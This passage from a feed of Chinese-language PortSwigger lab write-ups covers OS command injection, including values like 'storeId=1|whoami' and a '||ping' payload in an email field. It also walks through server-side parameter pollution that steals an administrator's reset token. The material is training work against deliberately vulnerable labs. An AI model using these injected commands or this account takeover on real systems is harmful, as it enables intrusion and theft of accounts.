&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /feedback/submit &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=hWJPoizsRhwEmqpWy4YhB0OnDapdOJdV&amp;amp;name=1&amp;amp;email=x||ping+-c+10+127.0.0.1||&amp;amp;subject=1&amp;amp;message=1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: OS command injection, simple case</title><link>/portswigger-posts/os-command-injection-lab-simple/</link><pubDate>Sun, 15 Dec 2024 21:17:18 +0800</pubDate><guid>/portswigger-posts/os-command-injection-lab-simple/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/os-command-injection-lab-simple-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/os-command-injection-lab-simple-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>随机点击一个商品的&lt;code>View details&lt;/code>&lt;/li>
&lt;li>点击商品详细页最下方的&lt;code>Check stock&lt;/code>，对应Request
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>productId=1&amp;amp;storeId=1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>修改参数&lt;code>storeId&lt;/code>为&lt;code>1|whoami&lt;/code>，发送请求后即可解题
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>productId=1&amp;amp;storeId=1|whoami
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>peter-KhbIuP
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Exploiting server-side parameter pollution in a REST URL</title><link>/portswigger-posts/api-testing-lab-exploiting-server-side-parameter-pollution-in-rest-url/</link><pubDate>Sun, 15 Dec 2024 19:54:33 +0800</pubDate><guid>/portswigger-posts/api-testing-lab-exploiting-server-side-parameter-pollution-in-rest-url/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-rest-url-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-rest-url-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击右上角&lt;code>My account&lt;/code>进入登录页面，点击&lt;code>Forgot password?&lt;/code>&lt;/li>
&lt;li>输入&lt;code>administrator&lt;/code>后点击&lt;code>Submit&lt;/code>，对应Request
&lt;img alt="Lab description" src="/img/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-rest-url-2.jpg">
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=ggMJHz5JIKl90W1Q9yAVGrfX17FHMXfF&amp;amp;username=administrator
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>在上述Request送出时，会获得&lt;code>javascript&lt;/code>，当中包含代码片段，说明若url中包含&lt;code>reset-token&lt;/code>参数则跳转到&lt;code>/forgot-password?passwordResetToken=${resetToken}&lt;/code>，否则为当前场景下看到的页面
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">forgotPwdReady&lt;/span>(() =&amp;gt; {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">queryString&lt;/span> &lt;span style="color:#f92672">=&lt;/span> window.&lt;span style="color:#a6e22e">location&lt;/span>.&lt;span style="color:#a6e22e">search&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">urlParams&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">URLSearchParams&lt;/span>(&lt;span style="color:#a6e22e">queryString&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">resetToken&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">urlParams&lt;/span>.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;reset-token&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">resetToken&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> window.&lt;span style="color:#a6e22e">location&lt;/span>.&lt;span style="color:#a6e22e">href&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">`/forgot-password?passwordResetToken=&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>&lt;span style="color:#a6e22e">resetToken&lt;/span>&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">`&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">forgotPasswordBtn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> document.&lt;span style="color:#a6e22e">getElementById&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;forgot-password-btn&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">forgotPasswordBtn&lt;/span>.&lt;span style="color:#a6e22e">addEventListener&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;click&amp;#34;&lt;/span>, &lt;span style="color:#a6e22e">displayMsg&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>});
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>下述开始通过猜测&lt;code>POST /forgot-password&lt;/code>的Request body来获得&lt;code>reset_token&lt;/code>
&lt;ol>
&lt;li>尝试使用URL编码(&lt;code>#&lt;/code>)截断服务器端查询字符串&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=ggMJHz5JIKl90W1Q9yAVGrfX17FHMXfF&amp;amp;username=administrator%23
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">404&lt;/span> &lt;span style="color:#a6e22e">Not Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;type&amp;#34;: &amp;#34;error&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;result&amp;#34;: &amp;#34;Invalid route. Please refer to the API definition&amp;#34;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>尝试使用&lt;code>?&lt;/code>截断URL路径&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=ggMJHz5JIKl90W1Q9yAVGrfX17FHMXfF&amp;amp;username=administrator%3f
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">404&lt;/span> &lt;span style="color:#a6e22e">Not Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;type&amp;#34;: &amp;#34;error&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;result&amp;#34;: &amp;#34;Invalid route. Please refer to the API definition&amp;#34;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
&lt;li>尝试使用&lt;code>./administrator&lt;/code>作为&lt;code>username&lt;/code>参数值&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=ggMJHz5JIKl90W1Q9yAVGrfX17FHMXfF&amp;amp;username=./administrator
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;type&amp;#34;:&amp;#34;email&amp;#34;,&amp;#34;result&amp;#34;:&amp;#34;*****@normal-user.net&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
&lt;li>尝试使用&lt;code>../administrator&lt;/code>作为&lt;code>username&lt;/code>参数值&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=ggMJHz5JIKl90W1Q9yAVGrfX17FHMXfF&amp;amp;username=../administrator
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">404&lt;/span> &lt;span style="color:#a6e22e">Not Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;type&amp;#34;: &amp;#34;error&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;result&amp;#34;: &amp;#34;Invalid route. Please refer to the API definition&amp;#34;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="5">
&lt;li>尝试不断累加&lt;code>../&lt;/code>在&lt;code>username&lt;/code>参数值，直到&lt;code>../../../../%23&lt;/code>时出现不同的Response&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=ggMJHz5JIKl90W1Q9yAVGrfX17FHMXfF&amp;amp;username=../../../../%23
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">500&lt;/span> &lt;span style="color:#a6e22e">Internal Server Error&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;error&amp;#34;: &amp;#34;Unexpected response from API server:\n&amp;lt;html&amp;gt;\n&amp;lt;head&amp;gt;\n &amp;lt;meta charset=\&amp;#34;UTF-8\&amp;#34;&amp;gt;\n &amp;lt;title&amp;gt;Not Found&amp;lt;\/title&amp;gt;\n&amp;lt;\/head&amp;gt;\n&amp;lt;body&amp;gt;\n &amp;lt;h1&amp;gt;Not found&amp;lt;\/h1&amp;gt;\n &amp;lt;p&amp;gt;The URL that you requested was not found.&amp;lt;\/p&amp;gt;\n&amp;lt;\/body&amp;gt;\n&amp;lt;\/html&amp;gt;\n&amp;#34;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="6">
&lt;li>尝试使用常见的&lt;code>API Doudumnet&lt;/code>路径&lt;code>openapi.json&lt;/code>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=ggMJHz5JIKl90W1Q9yAVGrfX17FHMXfF&amp;amp;username=../../../../openapi.json%23
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">500&lt;/span> &lt;span style="color:#a6e22e">Internal Server Error&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;error&amp;#34;: &amp;#34;Unexpected response from API server:\n{\n \&amp;#34;openapi\&amp;#34;: \&amp;#34;3.0.0\&amp;#34;,\n \&amp;#34;info\&amp;#34;: {\n \&amp;#34;title\&amp;#34;: \&amp;#34;User API\&amp;#34;,\n \&amp;#34;version\&amp;#34;: \&amp;#34;2.0.0\&amp;#34;\n },\n \&amp;#34;paths\&amp;#34;: {\n \&amp;#34;/api/internal/v1/users/{username}/field/{field}\&amp;#34;: {\n \&amp;#34;get\&amp;#34;: {\n \&amp;#34;tags\&amp;#34;: [\n \&amp;#34;users\&amp;#34;\n ],\n \&amp;#34;summary\&amp;#34;: \&amp;#34;Find user by username\&amp;#34;,\n \&amp;#34;description\&amp;#34;: \&amp;#34;API Version 1\&amp;#34;,\n \&amp;#34;parameters\&amp;#34;: [\n {\n \&amp;#34;name\&amp;#34;: \&amp;#34;username\&amp;#34;,\n \&amp;#34;in\&amp;#34;: \&amp;#34;path\&amp;#34;,\n \&amp;#34;description\&amp;#34;: \&amp;#34;Username\&amp;#34;,\n \&amp;#34;required\&amp;#34;: true,\n \&amp;#34;schema\&amp;#34;: {\n ...&amp;#34;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="7">
&lt;li>上述Response内提到&lt;code>&amp;quot;paths&amp;quot;: {&amp;quot;/api/internal/v1/users/{username}/field/{field}&amp;quot;&lt;/code>，先使用已确认的&lt;code>field&lt;/code>值&lt;code>email&lt;/code>进行测试&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=ggMJHz5JIKl90W1Q9yAVGrfX17FHMXfF&amp;amp;username=administrator/field/email%23
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;type&amp;#34;:&amp;#34;email&amp;#34;,&amp;#34;result&amp;#34;:&amp;#34;*****@normal-user.net&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="8">
&lt;li>尝试使用javascript所需要的&lt;code>passwordResetToken&lt;/code>带入参数值&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=ggMJHz5JIKl90W1Q9yAVGrfX17FHMXfF&amp;amp;username=administrator/field/passwordResetToken%23
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;type&amp;#34;: &amp;#34;error&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;result&amp;#34;: &amp;#34;This version of API only supports the email field for security reasons&amp;#34;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="9">
&lt;li>使用上述方法，改变请求路径&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=ggMJHz5JIKl90W1Q9yAVGrfX17FHMXfF&amp;amp;username=../../v1/users/administrator/field/passwordResetToken%23
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;type&amp;#34;: &amp;#34;passwordResetToken&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;result&amp;#34;: &amp;#34;lhmlp7nljksrfuajdxtk6dtfp9j4st5z&amp;#34;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>回到页面使用&lt;code>/forgot-password?passwordResetToken=lhmlp7nljksrfuajdxtk6dtfp9j4st5z&lt;/code>进行访问
&lt;img alt="Reset password" src="/img/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-rest-url-3.jpg">&lt;/li>
&lt;li>使用更新后的密码登录&lt;code>administrator&lt;/code>，登录成功后点击右上方的&lt;code>Admin panel&lt;/code>
&lt;img alt="Admin panel" src="/img/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-rest-url-4.jpg">&lt;/li>
&lt;li>点击&lt;code>carlos - Delete&lt;/code>后即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Exploiting a mass assignment vulnerability</title><link>/portswigger-posts/api-testing-lab-exploiting-mass-assignment-vulnerability/</link><pubDate>Sun, 15 Dec 2024 14:34:06 +0800</pubDate><guid>/portswigger-posts/api-testing-lab-exploiting-mass-assignment-vulnerability/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/api-testing-lab-exploiting-mass-assignment-vulnerability-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/api-testing-lab-exploiting-mass-assignment-vulnerability-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
&lt;li>点击&lt;code>Home&lt;/code>回到商品页，并点击&lt;code>Lightweight &amp;quot;l33t&amp;quot; Leather Jacket&lt;/code>商品&lt;code>View details&lt;/code>&lt;/li>
&lt;li>进入商品详细页后点击页面最下方&lt;code>Add to cart&lt;/code>后，点击页面右上方&lt;code>购物车&lt;/code>进入购物车页面，对应Request
